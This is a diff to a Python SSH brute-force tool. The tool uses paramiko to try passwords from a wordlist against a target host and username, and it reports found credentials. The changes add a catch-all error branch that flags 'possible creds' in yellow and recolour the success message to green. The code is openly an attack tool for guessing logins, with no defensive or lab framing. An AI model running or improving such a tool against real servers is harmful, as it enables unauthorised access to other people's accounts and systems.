@@ -16,7 +16,7 @@ def isopen(ip,port):
         return False
     finally:
         s.shutdown()
-def ssh_connection(host,port, username, password):
+def ssh_connection(host,port, username, password, code=0):
 #connect to host with the username and password given by the bruteforce function
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -24,6 +24,8 @@ def ssh_connection(host,port, username, password):
         ssh.connect(host, port, username, password)
     except paramiko.AuthenticationException:
         code = 1
+    except:
+        code = 2
     finally:
         ssh.close()
         return code
@@ -34,7 +36,12 @@ def succes(username, password):
                username:{username}\npassword:{password}
                **********
                """
-    print(colorama.Fore.RED, message)
+    print(colorama.Fore.GREEN, message)
+def unkown(username,password):
+    message = f"""
+                a unknow error has occured possible creds\nusername:{username}\npassword:{password}
+               """
+    print(colorama.Fore.YELLOW, message)
 def bruteforce(host, passwordlist, username, port=22):
     status = os.path.isfile(passwordlist)
     #check if paswordlist exists
@@ -53,6 +60,8 @@ def bruteforce(host, passwordlist, username, port=22):
                                 if code == 0:
                                     succes(username, row)
                                     break
+                                elif code == 2:
+                                    unkown(username,row)
                             if code==0:
                                 pass
                             else:
